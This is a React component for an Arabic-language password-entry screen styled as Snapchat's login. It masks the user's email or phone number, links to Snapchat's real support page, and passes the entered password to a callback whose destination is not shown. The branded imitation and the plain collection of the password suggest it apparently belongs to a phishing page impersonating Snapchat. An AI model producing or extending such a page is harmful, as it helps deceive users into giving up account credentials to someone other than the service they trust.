import { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';

interface LoginPasswordProps {
  identifier: string;
  onNext: (password: string) => void;
  onBack: () => void;
}

const inputStyle: React.CSSProperties = {
  width: '100%',
  padding: '0.75rem 1rem',
  border: '2px solid #e5e7eb',
  borderRadius: '0.5rem',
  fontSize: '1rem',
  transition: 'border-color 0.2s',
};

export default function LoginPassword({ identifier, onNext, onBack }: LoginPasswordProps) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [inputBorder, setInputBorder] = useState('#e5e7eb');

  const handleNext = () => {
    if (password.trim()) {
      onNext(password);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  const maskIdentifier = (id: string) => {
    if (id.includes('@')) {
      const [name, domain] = id.split('@');
      return `${name.substring(0, 3)}***@${domain}`;
    } else if (id.startsWith('+')) {
      return `${id.substring(0, 3)}***${id.substring(id.length - 2)}`;
    } else {
      return `${id.substring(0, 3)}***${id.substring(id.length - 2)}`;
    }
  };

  return (
    <div className="snapchat-container">
      <div className="snapchat-card">
        <h1 className="snapchat-title">إدخال كلمة المرور</h1>
        
        <div className="snapchat-user-display">
          <div className="snapchat-user-label">هل هذا ليس أنت؟</div>
          <div className="snapchat-user-value">{maskIdentifier(identifier)}</div>
        </div>

        <div className="mb-6">
          <label className="snapchat-subtitle">كلمة المرور</label>
          <div className="password-input-wrapper">
            <input
              type={showPassword ? 'text' : 'password'}
              style={{ ...inputStyle, borderColor: inputBorder }}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyPress={handleKeyPress}
              onFocus={() => setInputBorder('#3b82f6')}
              onBlur={() => setInputBorder('#e5e7eb')}
              placeholder=""
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="password-visibility-toggle"
            >
              {showPassword ? (
                <EyeOff size={20} />
              ) : (
                <Eye size={20} />
              )}
            </button>
          </div>
        </div>

        <div className="text-center mb-6">
          <a href="https://www.snapchat.com/support" target="_blank" rel="noopener noreferrer" className="snapchat-link">
            نسيت كلمة المرور
          </a>
        </div>

        <button
          onClick={handleNext}
          className="snapchat-button w-full"
          disabled={!password.trim()}
        >
          التالي
        </button>

        <div className="text-center mt-6">
          <button
            onClick={onBack}
            className="snapchat-link"
          >
            العودة
          </button>
        </div>
      </div>
    </div>
  );
}
